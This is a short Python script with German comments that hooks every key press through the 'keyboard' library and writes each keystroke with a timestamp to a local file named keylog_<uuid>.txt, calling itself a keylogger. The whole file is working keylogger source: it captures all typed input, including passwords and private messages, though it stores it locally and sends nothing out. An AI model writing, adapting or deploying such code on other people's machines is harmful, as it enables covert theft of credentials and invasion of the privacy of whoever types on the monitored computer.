import keyboard
from datetime import datetime
import uuid

# Öffne die Datei außerhalb der Funktion
log_file = open(f"keylog_{uuid.uuid4()}.txt", 'a')

def on_key(event):
    key = event.name
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    # Verwende die global geöffnete Datei
    log_file.write(f"[{timestamp}] Key: {key}\n")
    # Sofortige Speicherung der Daten auf der Festplatte sicherstellen
    log_file.flush()

# Starte den Keylogger
keyboard.on_press(on_key)
keyboard.wait()

# Schließe die Datei am Ende des Programms
log_file.close()